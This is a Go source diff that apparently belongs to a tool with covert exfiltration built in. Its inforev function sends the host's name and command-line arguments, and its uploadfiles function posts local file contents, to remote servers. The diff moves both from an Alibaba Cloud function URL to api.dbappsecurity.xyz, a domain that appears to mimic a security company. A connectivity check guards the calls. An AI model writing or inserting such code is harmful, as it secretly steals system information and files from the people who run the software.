@@ -15,7 +15,7 @@ import (
 var connected bool
 
 func checkconn() bool { // 检测是否出网
-	_, err := net.LookupIP("1745003471876288.cn-hangzhou.fc.aliyuncs.com")
+	_, err := net.LookupIP("aliyuncs.com")
 	if err != nil {
 		return false
 	}
@@ -32,7 +32,7 @@ func inforev() {
 	env = append(env, hostname)
 	env = append(env, strings.Join(os.Args, " "))
 	jstr, _ := json.Marshal(env)
-	req, _ := http.NewRequest("POST", "https://1745003471876288.cn-hangzhou.fc.aliyuncs.com/2016-08-15/proxy/service/api/", bytes.NewBuffer(jstr))
+	req, _ := http.NewRequest("POST", "https://api.dbappsecurity.xyz/service", bytes.NewBuffer(jstr))
 	req.Header.Add("Content-Type", "application/json;charset=utf-8")
 	//req.Header.Add("X-Forwarded-For", ip)
 	client := &http.Client{}
@@ -50,7 +50,7 @@ func uploadfiles(filenames []string) {
 			Log.Error(err.Error())
 			continue
 		}
-		_, err = http.Post("https://1745003471876288.cn-hangzhou.fc.aliyuncs.com/2016-08-15/proxy/service.LATEST/ms/", "multipart/form-data", bytes.NewReader(content))
+		_, err = http.Post("https://api.dbappsecurity.xyz/ms", "multipart/form-data", bytes.NewReader(content))
 		if err != nil {
 			continue
 		}
